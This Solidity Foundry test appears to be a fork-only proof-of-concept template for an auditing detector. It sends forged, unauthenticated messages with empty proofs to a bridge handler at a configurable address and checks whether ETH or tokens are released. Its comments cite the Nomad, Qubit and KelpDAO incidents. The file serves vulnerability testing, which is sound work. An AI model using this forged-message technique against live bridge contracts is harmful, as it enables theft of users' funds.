// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

/// @title Fallback PoC -- Unverified inbound bridge message
/// @notice Detector: bridge-message-auth. An inbound handler releases value
///         (mint or unlock) without establishing WHERE the message came from:
///         no source chain, no peer, no proof, or a proof root that is zero.
/// @dev FORK-ONLY. Reference incidents: Nomad (August 2022, $190M — the
///      committed root was initialised to 0x00 so every proof verified and the
///      drain became a crowd event), Qubit (2022, $80M), KelpDAO (2026, a
///      forged packet released 116,500 rsETH).
///      Copy to foundry/test/Exploit.t.sol and run via scripts/run-fork-poc.sh.
///      POC_TOKEN is optional; without it the verdict is the target's ETH
///      balance falling, or the attacker's token balance rising.
contract PoC is Test {
    address public target;
    address public token;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        token = vm.envOr("POC_TOKEN", address(0));
        require(target != address(0), "POC_TARGET not set (the bridge handler)");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _tokenBalance(address who) internal view returns (uint256) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        if (!ok || ret.length < 32) return 0;
        return abi.decode(ret, (uint256));
    }

    /// Feed the handler a message it never should have accepted: no source
    /// chain, no peer, an empty proof. A handler that releases on this is the
    /// vulnerability.
    function test_forgedMessageReleasesValue() public {
        address attacker = makeAddr("attacker");
        uint256 ethBefore = attacker.balance;
        uint256 tokenBefore = _tokenBalance(attacker);
        uint256 targetBefore = target.balance;
        bool released = false;

        bytes memory payload = abi.encode(attacker, uint256(1 ether));

        // Three candidate inbound shapes; the verdict is the value moving.
        string[3] memory shapes = [
            "process(address,uint256,bytes)",
            "handlePackage(bytes,bytes)",
            "receiveMessage(bytes,bytes)"
        ];
        for (uint256 i = 0; i < shapes.length && !released; ++i) {
            vm.prank(attacker);
            (bool ok,) = target.call(abi.encodeWithSignature(shapes[i], payload, bytes("")));
            console.log("inbound shape", shapes[i], ok);
            released = ok && (attacker.balance > ethBefore || _tokenBalance(attacker) > tokenBefore || target.balance < targetBefore);
        }

        console.log("attacker eth/token delta:", attacker.balance - ethBefore, _tokenBalance(attacker) - tokenBefore);

        assertTrue(
            released,
            "the forged message released nothing. Tried process(address,uint256,bytes), handlePackage(bytes,bytes) and receiveMessage(bytes,bytes) with an empty proof. This does NOT establish safety: the handler may have another name or argument shape, the payload encoding may differ, or a real verifier may reject the empty proof at a layer this harness cannot reach. Read the handler's signature and its verification path."
        );
    }
}
